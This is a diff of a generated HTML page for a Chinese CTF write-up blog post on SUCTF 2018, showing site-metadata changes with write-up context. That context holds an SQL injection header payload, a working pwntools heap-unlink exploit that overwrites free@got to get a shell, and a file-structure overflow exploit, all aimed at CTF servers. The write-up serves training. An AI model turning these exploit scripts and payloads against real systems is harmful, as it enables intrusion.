@@ -127,15 +127,15 @@
 <meta property="og:site_name" content="w4rd3n">
 <meta property="og:description" content="webwhere are you from level1修改HTTP头伪造IP. php里有三个值保存客户ip,分别是HTTP_CLIENT_IP,HTTP_X_FORWARDED_FOR,REMOTE_ADDR.  $_SERVER[&amp;#39;HTTP_CLIENT_IP&amp;#39;]如果有代理服务器,一般是代理服务器ip,没有则为空. $_SERVER[&amp;#39;HTTP_X_FORWARDED">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://hitworld.github.io/posts/c9b1afe3/3.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/c9b1afe3/4.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/c9b1afe3/5.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/c9b1afe3/6.png">
-<meta property="og:updated_time" content="2020-08-02T07:36:56.500Z">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/3.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/4.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/5.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/6.png">
+<meta property="og:updated_time" content="2020-08-09T06:33:51.845Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-suctf-2018-招新赛">
 <meta name="twitter:description" content="webwhere are you from level1修改HTTP头伪造IP. php里有三个值保存客户ip,分别是HTTP_CLIENT_IP,HTTP_X_FORWARDED_FOR,REMOTE_ADDR.  $_SERVER[&amp;#39;HTTP_CLIENT_IP&amp;#39;]如果有代理服务器,一般是代理服务器ip,没有则为空. $_SERVER[&amp;#39;HTTP_X_FORWARDED">
-<meta name="twitter:image" content="https://hitworld.github.io/posts/c9b1afe3/3.png">
+<meta name="twitter:image" content="https://hitworld.github.io/posts/undefined/3.png">
 
 
 
@@ -561,11 +561,11 @@
 <p><code>Client-Ip: 12&#39;,(selselectect/\*\*/fl4g/\*\*/ffromrom/\*\*/flaaag))#</code>.</p>
 <h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="stack-amp-amp-basic-pwn-amp-amp-babyarray"><a href="#stack-amp-amp-basic-pwn-amp-amp-babyarray" class="headerlink" title="stack &amp;&amp; basic pwn &amp;&amp; babyarray"></a>stack &amp;&amp; basic pwn &amp;&amp; babyarray</h3><p>一个越界两个溢出.</p>
 <h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><code>take_node</code>时越界,直接<code>unlink</code>攻击,修改<code>free@got</code>.</p>
-<img src="/posts/c9b1afe3/3.png" title="take_node函数">
+<img src="/posts/undefined/3.png" title="take_node函数">
 <hr>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x6020C0</span></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">touch</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'size : \n'</span>, str(size))</span><br><span class="line">    r.recvuntil(<span class="string">'chooice :\n'</span>,timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(index, payload)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'modify :\n'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'content\n'</span>, payload)</span><br><span class="line">    r.recvuntil(<span class="string">'chooice :\n'</span>,timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'delete\n'</span>, str(index))</span><br><span class="line">    r.recvuntil(<span class="string">'chooice :\n'</span>,timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'show\n'</span>, str(index))</span><br><span class="line">    r.recvuntil(<span class="string">'is : \n'</span>)</span><br><span class="line">    data = r.recvline()</span><br><span class="line">    r.recvuntil(<span class="string">'chooice :\n'</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(['./pwn'], env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)</span></span><br><span class="line">r = remote(<span class="string">"43.254.3.203"</span>,<span class="string">"10005"</span>)</span><br><span class="line">r.recvuntil(<span class="string">'chooice :\n'</span>,timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">touch(<span class="number">0x90</span>)</span><br><span class="line">touch(<span class="number">0x90</span>)</span><br><span class="line">touch(<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">touch(<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(show(<span class="number">0</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">0x3c3b78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">payload  = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(buf - <span class="number">0x18</span>) + p64(buf - <span class="number">0x10</span>) + <span class="string">"a"</span>*<span class="number">0x70</span> +p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">modify(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#buf = &amp;buf - 0x18</span></span><br><span class="line">payload  = p64(free_got)*<span class="number">4</span> + p64(<span class="number">0x6020d8</span>)*<span class="number">2</span> + <span class="string">"/bin/sh"</span></span><br><span class="line">modify(<span class="number">0</span>,payload)</span><br><span class="line">modify(<span class="number">0</span>,p64(libc_base + <span class="number">0x45390</span>))</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(r)[0])</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="easy-overflow-file-structure"><a href="#easy-overflow-file-structure" class="headerlink" title="easy_overflow_file_structure"></a>easy_overflow_file_structure</h3><p>漏洞点在于一次写入后没有<code>break</code>跳出循环,可以多次写入.</p>
-<img src="/posts/c9b1afe3/4.png" title="lookForHeader函数">
+<img src="/posts/undefined/4.png" title="lookForHeader函数">
 <hr>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./eofs")</span></span><br><span class="line">p = remote(<span class="string">"43.254.3.203"</span>, <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"GET / HTTP/1.1#"</span></span><br><span class="line">payload += <span class="string">"Host:"</span> + <span class="string">"a"</span> * <span class="number">0x7e</span> + <span class="string">"#"</span></span><br><span class="line">payload += <span class="string">"Username:"</span> + <span class="string">"a"</span> * <span class="number">0x7e</span> + <span class="string">"#"</span></span><br><span class="line">payload += <span class="string">"ResearchField:"</span> + <span class="string">"a"</span> * <span class="number">0x7e</span> + <span class="string">"#"</span></span><br><span class="line">payload += <span class="string">"ResearchField:"</span> + <span class="string">"cc"</span> + p64(<span class="number">0x602188</span>) + p64(<span class="number">0xdeadbeef</span>) + <span class="string">"#"</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="int-overflow-pwn"><a href="#int-overflow-pwn" class="headerlink" title="int_overflow_pwn"></a>int_overflow_pwn</h3><p>整数溢出导致栈溢出.</p>
@@ -575,12 +575,12 @@
 <h3 id="佛家妙语"><a href="#佛家妙语" class="headerlink" title="佛家妙语"></a>佛家妙语</h3><p>先<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>.</p>
 <p>然后按提示<code>base64</code>,<code>base32</code>,<code>base16</code>,<code>base58</code>.</p>
 <h3 id="stature"><a href="#stature" class="headerlink" title="stature"></a>stature</h3><p>明显是改图片高,把<code>1</code>改成<code>2</code>获得<code>flag</code>.</p>
-<img src="/posts/c9b1afe3/5.png" title="修改">
+<img src="/posts/undefined/5.png" title="修改">
 <hr>
 <h3 id="dead-z3r0"><a href="#dead-z3r0" class="headerlink" title="dead_z3r0"></a>dead_z3r0</h3><p>打开,前面一部分为字符串,后面一部分夹杂<code>python</code>函数名,把后面截出,反编译得以下代码.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPlainText</span><span class="params">()</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key = <span class="string">'LordCasser'</span></span><br><span class="line">    plain = getPlainText()</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <p>写出解密脚本获得提示.</p>
-<img src="/posts/c9b1afe3/6.png" title="修改">
+<img src="/posts/undefined/6.png" title="修改">
 <hr>
 <p>使用<code>stegosaurus</code>处理反编译前<code>pyc</code>获得<code>flag</code>.</p>
 
@@ -701,7 +701,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">185</span>
+                    <span class="site-state-item-count">174</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -744,27 +744,7 @@
                     
                       
                     
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">25</span>
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -863,29 +843,7 @@
                     
                       
                     
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">54</span>
+                    <span class="site-state-item-count">43</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -967,7 +925,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">717k</span>
+    <span title="站点总字数">710k</span>
   
 
   
@@ -976,7 +934,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">10:52</span>
+    <span title="站点阅读时长">10:46</span>
   
 </div>
 
